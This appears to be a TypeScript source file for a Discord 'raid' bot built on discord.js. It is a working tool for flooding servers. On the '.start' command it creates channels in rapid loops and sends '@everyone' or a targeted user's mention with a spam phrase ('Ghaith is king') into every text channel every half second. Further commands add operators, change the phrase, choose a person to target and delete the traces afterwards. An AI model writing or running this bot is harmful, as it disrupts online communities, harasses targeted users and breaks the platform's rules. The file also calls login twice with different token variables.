import { Client, Events, GatewayIntentBits, TextChannel } from 'discord.js';
import { storage } from './storage';

const AUTHORIZED_USER_IDS = new Set<string>(["1298640383688970293"]);
let isSpamming = false;
let spamInterval: NodeJS.Timeout | null = null;
let channelInterval: NodeJS.Timeout | null = null;
const createdChannelIds = new Set<string>();
let spamPhrase = "Ghaith is king";
let targetedUserId: string | null = null;

// Global client instance
export const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ] 
});

let isOnline = false;

export async function startBot() {
  if (!process.env.DISCORD_TOKEN) {
    console.warn("DISCORD_TOKEN not set. Bot will not start.");
    await storage.createLog({
      type: 'error',
      message: 'DISCORD_TOKEN environment variable is missing. Please add it to Secrets.',
    });
    return;
  }

  client.once(Events.ClientReady, async (c) => {
    console.log(`Ready! Logged in as ${c.user.tag}`);
    isOnline = true;
    await storage.createLog({
      type: 'info',
      message: `Bot started and logged in as ${c.user.tag}`,
    });
  });

  client.on(Events.MessageCreate, async (message) => {
    if (message.author.bot) return;

    // Authorization check
    if (!AUTHORIZED_USER_IDS.has(message.author.id)) return;

    if (message.content.startsWith('.recruit')) {
      const targetId = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
      if (targetId) {
        AUTHORIZED_USER_IDS.add(targetId);
        await storage.createLog({
          type: 'command',
          message: `Authorized user ${message.author.tag} recruited user ID: ${targetId}`,
        });
        try {
          await message.reply(`User <@${targetId}> has been recruited.`);
        } catch (e) {}
      }
      return;
    }

    if (message.content.startsWith('.revoke')) {
      const targetId = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
      if (targetId) {
        // Prevent revoking the primary owner if needed, but let's just allow it for now as per user request
        AUTHORIZED_USER_IDS.delete(targetId);
        await storage.createLog({
          type: 'command',
          message: `Authorized user ${message.author.tag} revoked user ID: ${targetId}`,
        });
        try {
          await message.reply(`User <@${targetId}> has been revoked.`);
        } catch (e) {}
      }
      return;
    }

    if (message.content.startsWith('.change')) {
      const newPhrase = message.content.split(' ').slice(1).join(' ');
      if (newPhrase) {
        spamPhrase = newPhrase;
        await storage.createLog({
          type: 'command',
          message: `Authorized user ${message.author.tag} changed spam phrase to: ${newPhrase}`,
        });
        try {
          await message.reply(`Spam phrase changed to: ${newPhrase}`);
        } catch (e) {}
      }
      return;
    }

    if (message.content.startsWith('.choose')) {
      const target = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
      if (target) {
        targetedUserId = target;
        await storage.createLog({
          type: 'command',
          message: `Authorized user ${message.author.tag} targeted user ID: ${target}`,
        });
        try {
          await message.reply(`Targeted user set to <@${target}>.`);
        } catch (e) {}
      } else {
        targetedUserId = null;
        try {
          await message.reply("Targeted user cleared. Pinging @everyone.");
        } catch (e) {}
      }
      return;
    }

    if (message.content === '.start') {
      if (isSpamming) return;
      isSpamming = true;
      
      await storage.createLog({
        type: 'command',
        message: `Authorized user ${message.author.tag} started INSANE spam routine`,
      });

      const guild = message.guild;
      if (!guild) return;

      // Fast channel creation
      const createChannels = async () => {
        if (!isSpamming) return;
        for (let i = 0; i < 10; i++) {
          if (!isSpamming) break;
          try {
            const channel = await guild.channels.create({
              name: spamPhrase,
              type: 0,
            });
            createdChannelIds.add(channel.id);
            
            // Immediately start spamming the new channel
            const textChannel = channel as TextChannel;
            const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
            textChannel.send(`${mention} ${spamPhrase}`).catch(() => {});
          } catch (e) {
            break;
          }
        }
      };

      // Fast message spamming
      const spamMessages = async () => {
        if (!isSpamming) return;
        const channels = guild.channels.cache.filter(c => c.isTextBased());
        channels.forEach(async (channel) => {
          if (!isSpamming) return;
          try {
            const textChannel = channel as TextChannel;
            // Send multiple messages per channel call to increase speed
            const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
            for(let i=0; i<3; i++) {
              if (!isSpamming) break;
              textChannel.send(`${mention} ${spamPhrase}`).catch(() => {});
            }
          } catch (e) {}
        });
      };

      createChannels();
      spamMessages();
      
      // Run routines at high frequency
      channelInterval = setInterval(createChannels, 1000); // Try creating channels every second
      spamInterval = setInterval(spamMessages, 500); // Spam messages every half second
    }

    if (message.content === '.stop') {
      isSpamming = false;
      if (spamInterval) {
        clearInterval(spamInterval);
        spamInterval = null;
      }
      if (channelInterval) {
        clearInterval(channelInterval);
        channelInterval = null;
      }

      // Respond immediately to the user
      try {
        await message.reply('Stopping and cleaning up...');
      } catch (e) {}
      
      await storage.createLog({
        type: 'command',
        message: `Authorized user ${message.author.tag} stopped spam routine and requested cleanup`,
      });

      const guild = message.guild;
      if (guild) {
        // Run cleanup in the background without blocking the response
        (async () => {
          // Cleanup: Delete all channels that were created during the session
          const channelDeletions = Array.from(createdChannelIds).map(async (channelId) => {
            try {
              const channel = await guild.channels.fetch(channelId);
              if (channel) {
                await channel.delete();
              }
            } catch (e) {}
          });
          createdChannelIds.clear();

          // Delete other channels with the specific name
          const nameDeletions = guild.channels.cache
            .filter(c => c.name === 'ghaith-is-king' || c.name === 'Ghaith is king' || c.name === spamPhrase.toLowerCase().replace(/\s+/g, '-'))
            .map(async (channel) => {
              try {
                await channel.delete();
              } catch (e) {}
            });

          await Promise.all([...channelDeletions, ...nameDeletions]);

          // Message cleanup in existing channels
          const textChannels = guild.channels.cache.filter(c => c.isTextBased());
          textChannels.forEach(async (channel) => {
            try {
              const textChannel = channel as TextChannel;
              const messages = await textChannel.messages.fetch({ limit: 100 });
              const spamMessages = messages.filter(m => (m.content.includes(spamPhrase) || m.content.includes('Ghaith is king')) && m.author.id === client.user?.id);
              if (spamMessages.size > 0) {
                await textChannel.bulkDelete(spamMessages).catch(() => {
                  spamMessages.forEach(m => m.delete().catch(() => {}));
                });
              }
            } catch (e) {}
          });
        })();
      }
      return;
    }

    if (message.content === '!ping') {
      try {
        await message.reply('Pong!');
        await storage.createLog({
          type: 'command',
          message: `Executed !ping command for ${message.author.tag}`,
        });
      } catch (err: any) {}
    }
  });

  client.on(Events.Error, async (error) => {
    console.error('Discord Client Error:', error);
    await storage.createLog({
      type: 'error',
      message: `Discord Error: ${error.message}`,
    });
  });

  try {
    await client.login(process.env.DISCORD_TOKEN);
  } catch (error: any) {
    console.error('Failed to login:', error);
    let errorMsg = error.message;
    if (errorMsg.includes('disallowed intents')) {
      errorMsg = "Disallowed Intents: Please go to the Discord Developer Portal, select your app, go to 'Bot', and enable 'MESSAGE CONTENT INTENT' under 'Privileged Gateway Intents'.";
    }
    await storage.createLog({
      type: 'error',
      message: `Failed to login: ${errorMsg}`,
    });
  }
}

export function getBotStatus() {
  return {
    online: isOnline,
    uptime: client.uptime,
    username: client.user?.tag
  };
}

client.login(process.env.DISCORD_BOT_TOKEN)
